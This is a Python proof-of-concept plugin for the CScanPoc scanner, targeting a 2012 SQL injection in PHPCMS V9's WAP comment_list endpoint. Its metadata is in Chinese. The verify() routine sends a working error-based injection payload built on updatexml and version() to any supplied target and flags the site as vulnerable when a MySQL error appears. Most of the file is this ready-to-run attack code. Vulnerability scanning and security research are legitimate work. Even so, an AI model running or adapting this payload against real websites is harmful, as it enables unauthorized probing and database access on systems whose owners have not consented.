# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0018'  # 平台漏洞编号，留空
    name = 'PHPCMS V9 WAP模块注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-10-21'  # 漏洞公布时间
    desc = '''
        PHPCMS采用PHP5+MYSQL做为技术基础进行开发。9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。
        PHPCMS V9 WAP模块注入漏洞：
        /index.php?m=wap&c=index&a=comment_list&commentid=content_12
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=011818'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'V9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '586a40dd-0929-42b4-9e24-885411719ab7'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1"
            url = arg + payload
            code, head, res, errcode, finalurl = hh.http(arg + payload)

            if code == 200:
                if "MySQL Query" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
